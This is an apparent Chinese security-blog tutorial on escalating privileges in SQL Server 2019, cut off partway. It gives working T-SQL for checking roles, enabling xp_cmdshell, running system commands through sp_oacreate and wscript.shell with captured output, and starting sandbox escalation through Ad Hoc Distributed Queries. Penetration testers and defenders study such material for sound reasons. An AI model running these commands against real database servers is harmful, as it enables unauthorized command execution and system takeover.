---
title: sql server提权总结
url: https://www.secpulse.com/archives/193570.html
source: 安全脉搏
date: 2022-12-16
fetch_date: 2025-10-04T01:39:10.373823
---

# sql server提权总结

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# sql server提权总结

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-12-15

16,279

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086544.png)

## 1.sqlserver的角色及权限

sqlserver的角色分为两种：服务器角色和数据库角色

**服务器角色：** 服务器角色的拥有者只有登入名，服务器角色是固定的，用户无法创建服务器角色。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086545.png "null")

**数据库角色：** 数据库角色的拥有者可以是用户也可以是数据库角色本身，管理员可以创建数据库角色。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-16710865451.png "null")

**在sqlserver中有三种特殊的用户：**（1）系统管理员（dba权限），对应服务器角色sysadmin，可以执行sqlserver的任何动作，包括数据库操作，文件管理，命令执行，注册表读取等，为sqlserver最高权限。（2）数据库所有者（dbo权限），对应数据库角色db\_owner， 可以执行数据库中技术所有动作，包括文件管理，数据库操作等。（3）public角色是一种特殊的固定角色，数据库的每个合法用户都属于该角色。它为数据库中的用户提供了所有默认权限。

**判断当前用户角色（权限）：**（1）判断是否是sysadmin（dba权限），执行`select is_srvrolemember('sysadmin')`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086547.png "null")

（2）判断是否是db\_owner（dbo权限），执行`select is_member('db_owner')`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-16710865471.png "null")

（3）判断是否是public（普通权限），执行`select is_srvrolemember('public')/select is_member('public')`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086548.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-16710865481.png "null")

## 2.最新版sqlserver提权测试（sqlserver2019）

文章测试均在sqlserver2019+win server2019中操作。经过测试sqlserver 2019默认安装，使用dba权限执行whoami不是system权限，这是因为默认安装的sqlserver服务不是用系统账户启动的。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086549.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-16710865491.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086553.png "null")

如果安装时或在服务中更改为本地系统账户，执行命令为system权限，可以创建用户提权。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086556.png "null")

## 3.xp\_cmdshell（dba权限）

xp\_cmdshell在低版本中默认开启，由于存在安全隐患，在sqlserver2005以后，xp\_cmdshell默认关闭。利用xp\_cmdshell执行系统命令

```
-- 判断xp_cmdshell是否存在，返回1证明存在xp_cmdshell
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086560.png "null")

```
-- 开启xp_cmdshell
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
-- 关闭xp_cmdshell
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086561.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086565.png "null")

```
-- 执行系统命令，sqlserver2019被降权为mssql权限
exec master..xp_cmdshell 'xxx'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086566.png "null")

## 4.sp\_oacreate+sp\_oamethod（dba权限）

在xp\_cmdshell被删除或不能利用是可以考虑利用sp\_oacreate，利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql）。sp\_oacreate 是一个存储过程，可以删除、复制、移动文件。还能配合 sp\_oamethod 来写文件执行系统命令。

```
-- 判断sp_oacreate是否存在，返回1证明存在sp_oacreate
select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086567.png "null")

```
-- 开启
exec sp_configure 'show advanced options',1;reconfigure;
exec sp_configure 'ole automation procedures',1;reconfigure;
-- 关闭
exec sp_configure 'show advanced options',1;reconfigure;
exec sp_configure 'ole automation procedures',0;reconfigure;
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-16710865671.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086568.png "null")

```
-- 执行系统命令
declare @shell int
exec sp_oacreate 'wscript.shell',@shell output
exec sp_oamethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c whoami'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-1671086569.png "null")

直接执行命令成功后无回显。

```
-- 回显执行系统命令结果
declare @shell int,@exec int,@text int,@str varchar(8000)
exec sp_oacreate 'wscript.shell',@shell output
exec sp_oamethod @shell,'exec',@exec output,'C:\Windows\System32\cmd.exe /c whoami'
exec sp_oamethod @exec, 'StdOut', @text out
exec sp_oamethod @text, 'readall', @str out
select @str;
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193570-16710865691.png "null")

## 5.沙盒提权（dba权限）

沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql），服务器拥有 jet.oledb.4.0 驱动。局限：（1）Microsoft.jet.oledb.4.0一般在32位操作系统上才可以 （2）Windows 2008以上 默认无 Access 数据库文件, 需要自己上传 sqlserver2015默认禁用Ad Hoc Distributed Queries，需要开启。

```
-- 开启Ad Hoc Distributed Queries
exec sp_configure 'show advanced options',1;reconfigure;
exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;
-- 关闭Ad Hoc Distributed Queries
exec sp_configure 'show advanced options',1;reconfigu...